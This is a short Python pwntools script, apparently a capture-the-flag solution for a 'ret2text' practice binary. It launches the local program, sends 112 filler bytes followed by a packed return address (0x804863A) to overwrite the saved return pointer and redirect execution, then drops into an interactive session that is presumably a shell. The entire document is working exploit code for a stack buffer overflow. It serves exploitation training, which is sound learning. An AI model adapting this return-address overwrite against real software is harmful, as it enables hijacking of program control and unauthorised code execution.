# !/usr/bin/env python
from pwn import *

sh = process('./ret2text')
addr = 0x804863A
sh.sendlineafter('anything?', b'A' * 112 + p32(addr))
sh.interactive()
